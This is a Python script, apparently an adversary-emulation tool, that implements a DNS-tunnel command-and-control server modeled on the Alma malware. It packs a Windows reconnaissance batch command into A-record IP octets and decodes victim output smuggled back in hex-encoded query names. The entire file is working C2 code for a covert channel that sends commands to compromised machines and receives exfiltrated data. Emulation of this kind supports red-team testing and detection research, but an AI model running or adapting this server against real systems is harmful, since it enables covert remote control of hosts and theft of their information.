import argparse
import socket
import base64
import sys
import time
from random import randint
from binascii import unhexlify
import logging

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.org/project/dnslib/>. Please install it with `pip install dnslib`.")
    sys.exit(1)


# defines the log format
LOG_FORMAT = "%(asctime)s.%(msecs)03d - %(levelname)s - %(message)s"
DATE_FORMAT = "%m/%d/%Y %H:%M:%S"
logging.basicConfig(filename='my.log', level=logging.DEBUG, format=LOG_FORMAT, datefmt=DATE_FORMAT)

START_MARKER = "36.37.94.33"
END_MARKER = "33.33.94.94"

COMMAND = """@echo off & chcp 65001
echo %userdomain%\\%username% 2>&1 & echo %computername% 2>&1 & echo ________________________________Task__________________________________ & schtasks /query /FO List /TN "Google_{50726F6A656374-414C4D41-48747470}" /V | findstr /b /n /c:"Repeat: Every:" 2>&1 & schtasks /query /FO List /TN "Micro_{50726F6A656374-414C4D41-446E73-2}" /V | findstr /b /n /c:"Repeat: Every:" 2>&1 & echo ______________________________________________________________________ 
"""

# extend the length of COMMAND to a multiple of 4
while len(COMMAND)%4:
    COMMAND += " "


def dns_query_responder(sock,addr,request,ip):
    logging.info("received dns requry of {domain} on type A".format(domain=str(request.q.qname)[:-1]))
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip)))
    logging.info("sending dns response to {addr} with data: {data}".format(addr=str(addr),data=reply.pack()))
    sock.sendto(reply.pack(),addr)


def output_processor(domain):
    data = domain.split("-")[2]
    return unhexlify(data).decode()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Modified Alma dns tunnel C2 emulation server")
    parser.add_argument("-domain", help = "the domain to listen on", required=True)
    args = parser.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0',53))

    print("Listening on {domain}".format(domain=args.domain))

    while True:
        data,addr = sock.recvfrom(1024)
        request=DNSRecord.parse(data)
        qnames = str(request.q.qname)[:-1]
        dns_query_responder(sock,addr,request,START_MARKER)


        for i in range(0, len(COMMAND), 4):
            data,addr = sock.recvfrom(1024)
            request=DNSRecord.parse(data)
            qnames = str(request.q.qname)[:-1]

            data = COMMAND[i:i+4]
            ip = '.'.join(str(ord(data[i])) for i in range(4))
            dns_query_responder(sock,addr,request,ip)

        data,addr = sock.recvfrom(1024)
        request=DNSRecord.parse(data)
        dns_query_responder(sock,addr,request,END_MARKER)
        print("command transfer finised")
    

        # start to retrieve the output
        data,addr = sock.recvfrom(1024)
        request=DNSRecord.parse(data)
        qnames = str(request.q.qname)[:-1]
        cnt = int(qnames.split('-')[1])
        output = output_processor(qnames)
        ip = ".".join(str(randint(0, 255)) for _ in range(4))
        dns_query_responder(sock,addr,request,ip)

        while cnt-1:
            data,addr = sock.recvfrom(1024)
            request=DNSRecord.parse(data)
            qnames = str(request.q.qname)[:-1]
            output += output_processor(qnames)

            ip = ".".join(str(randint(0, 255)) for _ in range(4))
            dns_query_responder(sock,addr,request,ip)
            cnt -= 1
        print(output)

